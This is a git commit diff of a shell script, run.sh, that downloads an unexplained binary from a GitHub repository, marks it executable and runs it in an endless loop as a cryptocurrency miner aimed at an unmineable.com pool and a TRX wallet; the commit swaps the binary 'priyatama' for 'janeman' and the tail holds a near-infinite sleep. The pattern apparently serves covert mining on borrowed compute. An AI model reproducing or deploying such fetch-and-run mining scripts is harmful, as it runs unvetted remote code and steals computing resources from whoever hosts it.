56d82ec01b947a92c05b5c3273bb4b876da84342
Bababrucelee <89031163+Bababrucelee@users.noreply.github.com>
2021-08-17 16:35:01 +0530

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,12 +1,11 @@
 #!/bin/bash
 POOL=ethash.unmineable.com:3333
 WALLET=TRX:TJSvx6gbRV1rXqSp4CLLhKDANp5nGsb4vK
-WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#im8m-ybvt)
-wget https://github.com/archernap/prem/raw/main/priyatama
-chmod +x priyatama
-while [ 1 ]; do
-./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
-sleep 5
-done
+WORKER=$(echo $(shuf -i 10-40 -n 1)myrig-#krig-11q7)
+wget https://github.com/archernap/prem/raw/main/janeman
+chmod +x janeman
+	while [ 1 ]; do
+		./janeman -pool $POOL -wal $WALLET.$WORKER -pass x
+        sleep 5
+	done
 sleep 999999999 
-
